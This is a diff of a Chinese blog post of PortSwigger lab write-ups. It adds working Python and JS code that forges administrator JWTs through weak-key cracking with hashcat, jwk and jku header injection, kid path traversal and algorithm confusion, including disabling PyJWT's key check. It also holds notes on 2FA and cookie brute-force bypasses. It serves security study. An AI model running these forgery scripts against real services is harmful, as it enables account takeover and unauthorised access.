@@ -409,7 +409,7 @@ export default function Post() {
             <X.P>频率限制有逻辑缺陷：只有存在的用户多次尝试登录才会被限制，如果用户不存在则会一直报用户名密码错误。利用这一点可以对字典上所有用户名发出几次请求（大于三次就会触发频率限制），然后找出最后一轮请求中回显不同的用户名`af`，然后枚举出密码为`moscow`。</X.P>
             <X.H2>Pr: 2FA broken logic</X.H2>
             <X.P>发现网站一些不合理的行为：验证码登录（`/login2`页面）验证的用户依赖于Cookie中的`verify`字段；在`/login2`页面直接刷新就可以接收到验证邮件。</X.P>
-            <X.P>利用这个问题，可以绕过账号密码登录，把Cookie改为`verify=carlos`，`GET`请求`/login2`后一次后，爆破验证码登录目标用户账号。</X.P>
+            <X.P>利用这个问题，可以跳过账号密码登录，把Cookie改为`verify=carlos`，`GET`请求`/login2`后一次后，爆破验证码登录目标用户账号。</X.P>
             <X.H2>Pr: Brute-forcing a stay-logged-in cookie</X.H2>
             <X.P>登录时选择Stay logged in，看到Cookie中保存了一条`stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`，Base64解码的结果为`wiener:51dc30ddc473d43a6011e9ebba6ca770`，可以反查到这是`peter`的MD5值。（有些在线网站可以反查MD5值）</X.P>
             <X.P>这样可以根据本题给的密码字典，构造出`stay-logged-in=base64("carlos:" + MD5(password))`形式的Cookie值，去请求`/my-account`；请求时不带`session`这个Cookie，此时如果密码正确会返回`200`，否则则被重定向到登录页面（`302`）。找到成功的Cookie值之后，复制到浏览器，访问`/my-account`即可登入`carlos`的账号。</X.P>
@@ -493,6 +493,250 @@ export default function Post() {
                 `}
             />
             <X.P>可以拿到管理员密码。</X.P>
+            <X.H1>JWT</X.H1>
+            <X.H2>笔记</X.H2>
+            <X.Uli>
+                <X.P>一个JWT包含了用`.`分隔的三部分：头部（Header）、载荷（Payload）、签名（Signature）。</X.P>
+                <X.Uli>Header和Payload都是Base64编码的JSON字符串，Header包含关于这个JWT的元数据，比如加密算法；Payload包含关于用户的信息，比如用户名和角色；这两个部分都不包含敏感信息，Base64解码后可以看到明文。</X.Uli>
+                <X.Uli>Signature是用于验证JWT是否被篡改的部分，它是由Header、Payload和一个密钥一起计算出来的，密钥存储在服务端。如果攻击者想篡改Header和Payload，在没有密钥的情况下也无法重新计算出匹配的Signature。</X.Uli>
+            </X.Uli>
+            <X.Uli>
+                <X.P>*JWT头部参数注入*：</X.P>
+                <X.Uli>`jwk`（JSON Web Key），有些服务器允许使用`jwk`参数中嵌入的密钥进行验证（自签名的JWT），此时攻击者可以用自己生成的RSA私钥签发JWT，并在`jwk`中携带自己的公钥。</X.Uli>
+                <X.Uli>`jku`（JWK Set URL），有些服务器允许使用`jku`参数来引用包含密钥的JWK Set，验证签名时，服务器会从该URL获取密钥。如果服务器没有验证密钥来源是否可信，则可以被利用。</X.Uli>
+                <X.Uli>`kid`参数注入+路径遍历，服务端可能用`kid`来决定使用哪个密钥，然而对于`kid`的格式并没有规范（能够对应到密钥即可），如果有些服务用文件名做`kid`并且这个参数同时存在路径遍历漏洞，攻击者可以指向一个已知的文件，从而可控密钥。常见的利用是`/dev/null`。</X.Uli>
+            </X.Uli>
+            <X.Uli>*JWT算法混淆*：\n算法混淆漏洞通常是由于JWT库实现有缺陷而引起的，许多库提供了一种靠JWT Header中的`alg`参数来决定使用的验证算法的功能（而不是显式指定）。如果开发者假设此功能仅用于验证非对称算法（如RS256），并使用公钥验证签名，那么攻击者可以将`alg`参数设置为对称算法（如HS256），然后使用RSA公钥签发JWT。此时，服务端在验证时会使用RSA公钥和HS256算法来验证JWT，导致通过验证。</X.Uli>
+            <X.H2>Ap: JWT authentication bypass via unverified signature</X.H2>
+            <X.P>题目说后端不验证Signature，意味着可以任意修改Payload中的信息。把用户名改为`administrator`，替换原有的JWT，可以作为管理员登录。</X.P>
+            <X.H2>Ap: JWT authentication bypass via flawed signature verification</X.H2>
+            <X.P>将Header中的`alg`修改为`none`可以绕过签名的检查，替换用户名同上一题。</X.P>
+            <X.H2>Pr: JWT authentication bypass via weak signing key</X.H2>
+            <X.P>根据给出的字典，用hashcat爆破出弱密钥：</X.P>
+            <X.CodeBlock language="bash" code="hashcat -a 0 -m 16500 eyJraWQiOiJkNmMxMTBjNi04ZTcwLTRlYzUtOTFjNS1mNzNiNTEzNDU4ZmQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MDQ4Mzg2Miwic3ViIjoid2llbmVyIn0.Ee6B5Vv1WoXljbUi6egxgcchwvfvNg5CWQtzBPBvlS0 jwt.secrets.list" />
+            <X.P>得到密钥是`secret1`，可以用这个密钥签发新的JWT。</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import jwt
+
+                token = "eyJraWQiOiJkNmMxMTBjNi04ZTcwLTRlYzUtOTFjNS1mNzNiNTEzNDU4ZmQiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MDQ4Mzg2Miwic3ViIjoid2llbmVyIn0.Ee6B5Vv1WoXljbUi6egxgcchwvfvNg5CWQtzBPBvlS0"
+                key = "secret1"
+
+                headers = jwt.get_unverified_header(token)
+                payload = jwt.decode(token, options={"verify_signature": False})
+                print(payload)  # {'iss': 'portswigger', 'exp': 1740483862, 'sub': 'wiener'}
+
+                payload["sub"] = "administrator"
+                token_exp = jwt.encode(payload, key=key, algorithm="HS256", headers=headers)
+                print(token_exp)
+                `}
+            />
+            <X.H2>Pr: JWT authentication bypass via jwk header injection</X.H2>
+            <X.P>题目说后端支持`jwk`参数，我们可以嵌入自己生成的RSA公钥，并用私钥签发JWT。</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import jwt
+                import base64
+                from Crypto.PublicKey import RSA
+
+                token = "eyJraWQiOiI0Mzc2NmI1NS1hOTk4LTRhYTEtYWI0Mi0yMjRkY2I2YWVkMDkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MDQ4ODI1OCwic3ViIjoid2llbmVyIn0.DnpSkEL59D6wFgfzwjXuWPxsRDuSEDTEh7Y1TkmaFJuxVCQKc73ntvFmoZzop9ywn-olr43jwpgT6qT9sdWF2iRN9DQC7lEBoEOSTeoL6aVe2SIyDhPZQoJxcyt1axfv1Eib9O3uvGLN0M9fXCbw1EIFdgy0UpAMWtIjvxHi6Vzwbfmn9dFNpL8aQiBkP4zWJ1HYINCZrH3NxeBxBUAtVLHSubMPdWHjvIxJd6wnFtkX7VdPi4d2sQwjyYQlnUTIIqCah70PTkLzSZPRap1op8Qwv2lTJS1TlL9NYXral83GSkiwhBrVA747Co7v3IY5YM1zRb3BgWYfU1unTHi5JA"
+
+                headers = jwt.get_unverified_header(token)
+                payload = jwt.decode(token, options={"verify_signature": False})
+                print(headers)  # {'kid': '43766b55-a998-4aa1-ab42-224dcb6aed09', 'alg': 'RS256'}
+                print(payload)  # {'iss': 'portswigger', 'exp': 1740488258, 'sub': 'wiener'}
+
+                # 生成攻击者控制的RSA密钥对
+                key = RSA.generate(2048)
+                private_key = key.export_key()
+                public_key = key.publickey().export_key()
+                n, e = key.n, key.e
+
+
+                def b64_url_encode(data):
+                    byte_length = (data.bit_length() + 7) // 8
+                    return base64.urlsafe_b64encode(data.to_bytes(byte_length, byteorder="big")).decode("utf-8").rstrip("=")
+
+
+                jwk = {
+                    "kty": "RSA",
+                    "n": b64_url_encode(n),
+                    "e": b64_url_encode(e),
+                    "kid": headers["kid"]
+                }
+                print(jwk)
+
+                headers["jwk"] = jwk
+                payload["sub"] = "administrator"
+                token_exp = jwt.encode(payload, key=private_key, algorithm="RS256", headers=headers)
+                print(token_exp)
+                `}
+            />
+            <X.H2>Pr: JWT authentication bypass via jku header injection</X.H2>
+            <X.P>利用方式和上一题很像，本题后端支持`jku`参数，我们把自己生成的RSA公钥以{'`{"keys": [jwk]}`'}的形式设置为Exploit Server的响应，并把`jku`参数设置为对应的URL。和之前一样替换用户名为`administrator`。</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import jwt
+                import json
+                import base64
+                from Crypto.PublicKey import RSA
+
+                token = "eyJraWQiOiJiMzE2NDg4OS1iMDYwLTQxZjktYTMyMC1mMDU4NjYzNDk3NWUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MDgzNTM2OCwic3ViIjoid2llbmVyIn0.sNDGLHXVpG7Sijztwt7DT7nuERHgwwghx1tfm9CXdbg4j3qfZSBSRDQhrUmj4FBfRcSmJKdGQcprC-hTLxg4W0oiHvv3NfkRdKy8DvKXFpo4OIdmP4UKmzQ5k7I6Iqp5ZHssKWuNrlvtwf_RRp_8iMYgVju5CI4SAs4m5eqnYkpGiv2ZYDKPrHU7sQkzvu79QN_ozVcieV9JGc6e63sk1fjZil27dDILYmHPV5Iq7xYjvHs2rGIbSlIuI23dQeWakWhgsF8q0ryER59-B3yi8hbCx0SHt6NEd50SO8z77eYVPd2XlBk3vDl-TjzmK2n9i9VVGBqTAu5ASXHJVb55vg"
+
+                headers = jwt.get_unverified_header(token)
+                payload = jwt.decode(token, options={"verify_signature": False})
+                print(headers)  # {'kid': 'b3164889-b060-41f9-a320-f0586634975e', 'alg': 'RS256'}
+                print(payload)  # {'iss': 'portswigger', 'exp': 1740835368, 'sub': 'wiener'}
+
+                # 生成攻击者控制的RSA密钥对
+                key = RSA.generate(2048)
+                private_key = key.export_key()
+                public_key = key.publickey().export_key()
+                n, e = key.n, key.e
+
+
+                def b64_url_encode(data):
+                    byte_length = (data.bit_length() + 7) // 8
+                    return base64.urlsafe_b64encode(data.to_bytes(byte_length, byteorder="big")).decode("utf-8").rstrip("=")
+
+
+                jwk = {
+                    "kty": "RSA",
+                    "n": b64_url_encode(n),
+                    "e": b64_url_encode(e),
+                    "kid": headers["kid"]
+                }
+                # 生成JWK Set，设置为Exploit Server的响应
+                jwk_set = {"keys": [jwk]}
+                print(json.dumps(jwk_set, indent=2))
+
+                headers["jku"] = "https://exploit-0a370036034e486581585b4801f500de.exploit-server.net/jwks.json"
+                payload["sub"] = "administrator"
+                token_exp = jwt.encode(payload, key=private_key, algorithm="RS256", headers=headers)
+                print(token_exp)
+                `}
+            />
+            <X.H2>Pr: JWT authentication bypass via kid header path traversal</X.H2>
+            <X.P>`kid`参数存在路径遍历漏洞，可以指向`/dev/null`，从而可用空字符串进行签名。</X.P>
+            <X.CodeBlock
+                language="python"
+                code={`
+                import jwt
+
+                token = "eyJraWQiOiI0YzA0YzdjZS0wNWFiLTQwODMtYmM1My00MGYxNGMyMDJhNzIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MDgxODU2NSwic3ViIjoid2llbmVyIn0.D-inM9parROYgRuzAkSTrVRFW5GchWFVXgXS15hr27I"
+
+                headers = jwt.get_unverified_header(token)
+                payload = jwt.decode(token, options={"verify_signature": False})
+                print(headers)  # {'kid': '4c04c7ce-05ab-4083-bc53-40f14c202a72', 'alg': 'HS256'}
+                print(payload)  # {'iss': 'portswigger', 'exp': 1740818565, 'sub': 'wiener'}
+
+                headers["kid"] = "../../../../../../dev/null"
+                payload["sub"] = "administrator"
+                token_exp = jwt.encode(payload, key="", algorithm="HS256", headers=headers)
+                print(token_exp)
+                `}
+            />
+            <X.H2>Ex: JWT authentication bypass via algorithm confusion</X.H2>
+            <X.P>算法混淆，公钥可以请求`/jwks.json`获得，思路就是用RSA公钥和HS256算法签名造成混淆。然而这题Python实现的时候有两个问题：</X.P>
+            <X.P>首先，使用`algorithm="HS256"`和RSA公钥签名时，RSA公钥格式会被检测到，会报异常：</X.P>
+            <X.CodeBlock language="text" code="jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret." />
+            <X.P>解决办法是，找到`site-packages/jwt/algorithms.py`文件，在类`HMACAlgorithm`的方法`prepare_key`中注释掉检验的逻辑：</X.P>
+            <X.CodeBlock
+                language="python"
+                highlightLines="4-8"
+                code={`
+                def prepare_key(self, key: str | bytes) -> bytes:
+                    key_bytes = force_bytes(key)
+
+                    # if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
+                    #     raise InvalidKeyError(
+                    #         "The specified key is an asymmetric key or x509 certificate and"
+                    #         " should not be used as an HMAC secret."
+                    #     )
+
+                    return key_bytes
+                `}
+            />
+            <X.P>然后会发现生成的JWT仍然无法通过Lab，这是因为和服务端用的库不同。经调试，Python通过`RSA.construct((n, e)).public_key().exportKey()`生成的公钥还需要在结尾补一个`\\n`。Python的利用代码如下：</X.P>
+            <X.CodeBlock
+                language="python"
+                highlightLines="30"
+                code={`
+                import jwt
+                import base64
+                import requests
+                from Crypto.PublicKey import RSA
+
+                token = "eyJraWQiOiJlZmI0YmExMS02ODU0LTRjMTItYWY0MS00MDk0NDIxM2QwYmEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MDg0NzY4NCwic3ViIjoid2llbmVyIn0.bvQu30Zqmmj7ump3V1Lwkg6G_w2ZsFhlbHuv0XCBWNE9LrnxLHcxQ54m8-iwGrbA-Bjhg37PyFhTIK8bsK0WCmWI3B88mK8WxeXP_RuZGXwpatapYH7Inh_gu3Vq25Ac8CMoD0dywM1rP6G3-_R4Z5B5LsojCoS8wZW8bg4Ax9kYLk3xJPigv2eYboK8JYKFoJSDXNfWt5QMK2_PqlBuz9dZBRJ4dnFK54KXpz8CXOr0yFX8Eon5nDpnx4ngdG4YsLr_1jLbnlM9y7rMqaBdYWQEEzZhTl2FkTiPkvsR0JImRNTFiRz8HlFekcPaWPXDh8iHLNoXKiwnkhHgvi1dCg"
+
+                headers = jwt.get_unverified_header(token)
+                payload = jwt.decode(token, options={"verify_signature": False})
+                print(headers)  # {'kid': 'efb4ba11-6854-4c12-af41-40944213d0ba', 'alg': 'RS256'}
+                print(payload)  # {'iss': 'portswigger', 'exp': 1740847684, 'sub': 'wiener'}
+
+                jwk_set = requests.get("https://0ae500e0036cb3ae813dfc5e004e00d0.web-security-academy.net/jwks.json").json()
+                jwk = jwk_set["keys"][0]
+                print(jwk)
+
+
+                def b64_url_decode(data):
+                    return int.from_bytes(base64.urlsafe_b64decode(data + "=="), byteorder="big")
+
+
+                n = b64_url_decode(jwk["n"])
+                e = b64_url_decode(jwk["e"])
+
+                public_key = RSA.construct((n, e)).public_key().exportKey()
+                print(public_key)
+
+                headers["alg"] = "HS256"
+                payload["sub"] = "administrator"
+                token_exp = jwt.encode(payload, key=public_key + b"\\n", algorithm="HS256", headers=headers)
+                print(token_exp)
+                `}
+            />
+            <X.P>如果是用JS的JWT库则没有这个问题。这里直接粘贴Python中拿到的`jwk`和`payload`了。</X.P>
+            <X.CodeBlock
+                language="js"
+                code={`
+                const jwt = require("json-web-token");
+                const jwkToPem = require("jwk-to-pem");
+
+                const publicKey = jwkToPem({
+                        "kty": "RSA",
+                        "e": "AQAB",
+                        "use": "sig",
+                        "kid": "efb4ba11-6854-4c12-af41-40944213d0ba",
+                        "alg": "RS256",
+                        "n": "siG0wJaJun6PoROAY8D5hLjsX9lG9gg3Pz_Kn5HF8TJ0fnK563uhbONdTRqyHE_DcIcQOCBJBQ7jSC7G0sEpDHN2TiQGZTdginbkxRxBzFgSeOWEaqu0ZW1oA7JTJ60DPlaL1YW6S9plIx3IqPXMiFVQeaWurYmex3RgnnnrH5B4hSrXsWwgdr2M_UJtWVr2QLUcOuB4JeGm5xtdXwxsMTy0zYgWrLKUfZGNJn9achF1q6yp62rVUNEgOILrAx2I7Q2HAsH7BnAB8aAGahImTGVUDnLl057rkasgkQ_vNC0v-QquF1ub2sfEL6MFbsAu4XChtsPuAJOI4xlpXNDxhw",
+                    }
+                );
+
+                console.log(publicKey);
+
+                function signJWT(payload) {
+                    return new Promise((resolve, reject) => {
+                        jwt.encode(publicKey, payload, "HS256", (err, token) => {
+                            if (err) {
+                                return reject(new Error("Error encoding token"));
+                            }
+                            resolve(token);
+                        });
+                    });
+                }
+
+                signJWT({
+                    iss: "portswigger",
+                    exp: 1740847684,
+                    sub: "administrator",
+                }).then(token => {
+                    console.log(token);
+                });
+                `}
+            />
             <X.H1>Web LLM attacks</X.H1>
             <X.H2>Ap: Exploiting LLM APIs with excessive agency</X.H2>
             <X.P>题目给了AI聊天功能，还能查看后端日志，聊了几句后看日志发现有大模型工具调用：</X.P>
